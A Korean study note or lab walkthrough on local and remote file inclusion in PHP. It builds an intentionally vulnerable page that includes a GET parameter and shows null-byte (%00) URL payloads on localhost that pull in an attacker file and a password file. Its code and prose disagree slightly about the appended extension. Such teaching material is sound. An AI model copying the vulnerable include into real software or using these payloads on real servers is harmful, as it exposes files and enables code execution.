# LFI & RFI (18.07.12) #

```
* LFI - local에 대한 File Inclusion  (파일 포함)    

* RFI - Remote 에 대한 file Inclusion (파일 포함)
```

> Inclusion : 내 외부에서 특정 파일을 포함 시켜 취약점을 공격하는 해킹 기법                

- 해킹으로 말하자면 LFI 와 RFI 를 이용하여 웹 서버에 악성 코드를 넣는 기법.
  * 대표적인 것이 php의 include 함수이다.  역할은 특정 파일을 포함 시켜 스크립트를 실행.



![KakaoTalk_20180712_200615980](C:\Users\Yellme\Desktop\KakaoTalk_20180712_200615980.png)

LFI 를 통해 일반적인 파일을 불러와서 실행 시킨 웹 프로그래밍을 나타낸 것이다.

여기서 로컬 파일 대신 원격 파일을 불러 RFI 를 실행 할 수도 있다.![KakaoTalk_20180712_200758113](C:\Users\Yellme\Desktop\KakaoTalk_20180712_200758113.png)

저기 http 로컬 파일 부분에서 공격자가 특정 악성 파일을 넣거나 시스템상의 중요한 파일을 불러오게 만드는 것이 LFI 의 기본적인 이론이다.



------



## 실습 ##

실습을 하려면  autoset 9 와 wordpress 가 필요하다. 

[autoset 다운 받기](http://autoset.net/xe/download_autoset_9_0_0) 눌러서 다운을 받으신 후, 설정은 구글링 참고 하셔서  [wordpress 설치과정 ](http://luxmylife.tistory.com/231) 을 보며 설치해주세요.

이 실습의 예제는 색상을 선택하면 해당 색상의 글자가 나오는 프로그램이다.

해당 프로그램은 사용자로부터 색상을 넘겨받아 브라우저에 색상을 나타내는 프로그램이다.

이떄, 해당 프로그램의 변수를 넘기는 부분의 취약점을 파악해 다른 목적의 코드를 넘겨 해킹을 하는 실습이다.

실습 과정은 다음과 같은 과정으로 이루어진다.

![KakaoTalk_20180712_200919235](C:\Users\Yellme\Desktop\KakaoTalk_20180712_200919235.png)

**1) Step 1  : 색상 변환 php 예제 만들기**

< color.html >

```
<center>
<form action='vulnerable.php' method="get">
<select name="COLOR">
<option value="red">red</option>
<option value="blue">blue</option>
</select>
<input type="submit">
</form>
</center>
```

from 은 색상 값을 컬러라는 변수를 통해 Vulneable.php 를 Get 방식으로 넘긴다는 내용이고, 선택 가능 한 색은 red 와 blue 두가지 색상 뿐이다.

< blue.php >

```
<center>
<font color='BLUE'><h1>BLUE</h1></font>
</center>
```

< Red.php >

```
<center>
<font color='red'><h1>RED</h1></font>
</center
```

<Vulneable.php >

```
<?php
if (isset($_GET['COLOR']))
	$color = $_GET['COLOR'];
include ($color.'.hello.txt');
?>
```

이 소스코드는 color.html 에서 컬러 변수 값을 받아 해당 색상 파일을 읽어서 보여주는 것이다.



자 ! 이제 작성한 파일을 모두 lfi 폴더에 넣고 color.html를 실행 해보면 

![1531415797993](C:\Users\Yellme\AppData\Local\Temp\1531415797993.png)

이런 화면이 뜰 것이다.  그럼 일단 반은 성공이다. 

그리고 나서 기본 값인 red를 선택후 제출을 누르면 다음 화면이 나오게 된다.![1531416311508](C:\Users\Yellme\AppData\Local\Temp\1531416311508.png)

**2) Step 2 : 색상 외의 다른 파일 포함**

두번째 단계는 LFI 공격으로 공격자가 원하는 파일을 포함 시켜야한다. 

< hello.txt >   -  공격자 파일

```
<center>
<?php
$color = 'hello';
echo "user : ".$color."\n\n";
?>
</center>
```

이 파일을 C:\\\\upload 에 저장을 하고 

Vulneable.php 의 include ($color.'.php') 에 hello.txt 를 넣는다. 

하지만  hello.txt를 넘겨주게 되면 다음과 같은 에러가 발생한다.

![1531417593323](C:\Users\Yellme\AppData\Local\Temp\1531417593323.png)

에러가 발생한 이유는 hello.txt 만 포함을 시키고 싶은데 Vulneable.php는 파일명을 받아 뒤에 

**.php** 확장자를 붙이기 때문이다. 

php는 문자열 처리시 문자열 끝에 마지막을 의미하는 Null Byte(0x00)를 넣는다.  그리고 프로그램은 문자열을 읽으면서 Null Byte를 만나게 되면 해당 문자열이 끝났음으로 인식을 한다.

그렇기 때문에 전달 변수에 Null Byte를 넣어 php 확장자를 제거 해야한다. 

그래서 url 인코딩 값인 %00을 사용을 해야한다.

```
http://127.0.0.1/lfi/Vulneable.php?COLOR=C:\\upload\\hello.txt%00
```

이러한 공격을 퍼센트 인코딩 (Percent Encoding)이라고한다. 

위에 있는 url 를 넘겨주게 되면 다음과 같은 화면이 나온다.

![1531418120190](C:\Users\Yellme\AppData\Local\Temp\1531418120190.png)

LFI 공격은 웹 프로그램의 'COLOR'와 같은 매개변수 등의 취약점을 통해 의도치 않은 서버 내 파일인 'hello.txt' 를 실행을 시킨다.



**3) Step 3 : 시스템 패스워드 파일 포함**

이제 여기서 세번째 단계인 시스템의 패스워드를 가져오도록 하자.

일단 password.txt 파일을 만들어  Sean / qwer1234 (아이디 / 패스워드) 를 적어서

C:\Temp\password.txt  에 넣어준다.   

아래의 url과 같이 퍼센트 인코딩을 해주고 넘겨주게 되면 !!

```
http://127.0.0.1/lfi/Vulneable.php?COLOR=C:\\Temp\\password.txt%00
```



![1531419440184](C:\Users\Yellme\AppData\Local\Temp\1531419440184.png)

 

이 화면이 나오면 LFI 공격으로 시스템의 패스워드 해킹이 성공한 것이다.

이렇게 LFI의 간단한 공격 실습이 끝났다.